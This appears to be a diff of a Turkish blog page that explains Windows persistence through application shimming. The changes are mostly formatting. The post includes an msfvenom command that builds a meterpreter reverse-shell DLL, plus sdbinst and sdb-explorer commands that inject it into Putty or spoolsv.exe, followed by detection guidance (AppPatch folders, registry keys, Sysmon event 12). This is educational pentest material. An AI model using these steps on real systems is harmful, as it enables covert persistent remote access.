@@ -22,7 +22,7 @@
 
 <header class="blog-header">
     <h1><a href="https://enesergun.net" class="glitch" data-text="Enes Ergün">Enes Ergün</a></h1>
-    <p> Personel homepage about of my Profession </p>
+    <p> Personel homepage </p>
     <nav>
         <a href="https://enesergun.net/">INDEX</a>
         <a href="https://enesergun.net/archives">ARCHIVES</a>
@@ -55,9 +55,8 @@
 <h2>Uygun bir DLL Dosyası Hazırlamak</h2>
 <p>Burada siz isterseniz kendinize özel bir DLL dosyası hazırlayabilirsiniz fakat okuduğum örnekte bu DLL dosyası Reverse Shell almak için kullanılmaktadır. </p>
 <p>MSFVenom ile DLL Dosya formatında Reverse Shell oluşturmak için</p>
-<div class="highlight"><pre><span></span>msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; pentestlab.dll
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; pentestlab.dll
+</code></pre></div>
 
 <h2>Arayüz ile Herhangi bir Uygulamaya DLL'i Enjekte Etmek</h2>
 <p>Bunun için Windows'un bize sunmuş olduğu ADK Toolkit uygulamasını açıyoruz ve burada sol sütundan Custom databases altında yeni bir database oluşturuyoruz. </p>
@@ -70,17 +69,15 @@
 <p><img alt="Options for InjectDLL" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll-options.png"></p>
 <p>İşte bu kadar tüm işlemler tamamlandıktan sonra artık bir <code>sdb</code> dosyasına sahibiz. Buradan sonraki kısım ise bu <code>sdb</code> dosyasını sisteme eklemek.</p>
 <p>Bunun için </p>
-<div class="highlight"><pre><span></span>sdbinst olusturdugunuzsdb.sdb
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>sdbinst olusturdugunuzsdb.sdb
+</code></pre></div>
 
 <p><img alt="SDB Install" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-installed.png"></p>
 <p>Evet artık her şeyimiz tamamlandı, sistem yöneticimiz ne zaman Putty'yi açarsa bize Reverse Shell düşecektir. Metasploit üzerinde Multi handler açıp sürekli dinleyerek nurtopu gibi bir meterpreter shell'e sahip olabilirsiniz. </p>
 <h2>Arayüz Olmadan Enjekte Etmek</h2>
 <p>Bunun için CLI üzerinden aşağıdaki komutunu girmeniz yeterli olacaktır.</p>
-<div class="highlight"><pre><span></span>sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="err">sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe</span>
+</code></pre></div>
 
 <p>Tabi burada illa kurulu bir uygulama olmasına gerek yok isterseniz Windows sistem üzerinde çalışan herhangi bir exe'ye de bunu enjekte edebilirsiniz. Okuduğum makale örneğinde <code>spoolsv.exe</code> dosyasına enjekte edilmiştir.</p>
 <h2>Peki Her Şey Güzel Biz Bu İşlem Olduğunda Anlayabilir Miyiz?</h2>
@@ -88,25 +85,22 @@
 Uzun cevap:</p>
 <p>Oluşturulan bu SDB dosyalarına ait kayıtlar Windows sistemler altında AppPatch klasörü altında tutulmaktadır. </p>
 <p>Bu klasöre ulaşmak için: </p>
-<div class="highlight"><pre><span></span><span class="c">%WINDIR%\AppPatch\custom</span>
+<div class="highlight"><pre><span></span><code><span class="c">%WINDIR%\AppPatch\custom</span>
 <span class="c">%WINDIR%\AppPatch\AppPatch64\Custom</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>Ha bunun yerine isterseniz Process Explorer içerisinde de kaybolabilirsiniz.</p>
 <h2>Tespit etmek</h2>
 <p>Registry değişikliklerini veya dosya konumlarını izlemek bunun için bir yöntemdir. Takip edilecek Registry ve dosya konumları aşağıda verilmiştir. Oluşturulacak yeni bir key SysMon üzerinde <code>12</code> event ID ile tetiklenecektir. </p>
 <p>Registry konumları:</p>
-<div class="highlight"><pre><span></span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\
-HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="err">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\</span>
+<span class="err">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\</span>
+</code></pre></div>
 
 <p>Dosya konumu:</p>
-<div class="highlight"><pre><span></span><span class="c">%WINDIR%\AppPatch\custom</span>
+<div class="highlight"><pre><span></span><code><span class="c">%WINDIR%\AppPatch\custom</span>
 <span class="c">%WINDIR%\AppPatch\AppPatch64\Custom</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>Daha detaylı bir bilgi almak için Sean Price'ın <a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims.pdf">sunumunu</a> kullanabilirsiniz.</p>
 <p>Okuduğum yazı:
